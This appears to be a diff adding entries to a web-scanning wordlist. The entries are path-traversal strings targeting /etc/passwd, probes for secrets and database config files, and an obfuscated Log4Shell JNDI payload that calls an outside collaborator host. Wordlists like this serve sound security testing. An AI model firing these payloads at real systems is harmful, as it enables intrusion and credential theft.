@@ -1,0 +1,13 @@
+/_SESSION[logged]=1
+/wp-content/mysql.sql
+/../../c:/windows/system32/drivers/etc/hosts
+/api/v1/database/_info?q=(keys:!(permissions))
+%24%7Bjndi:ldap://%24%7BhostName%7DXXXX%24%7B::-.%http://7Dburpcollaborator.net%7Dzzzz
+/log/production.log
+/config/app_env.yml
+/config/database.yml
+/config/secrets.yml
+/v1/docs//..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\/etc/passwd
+accesslogs/
+/accesslogs/
+/accesslogs
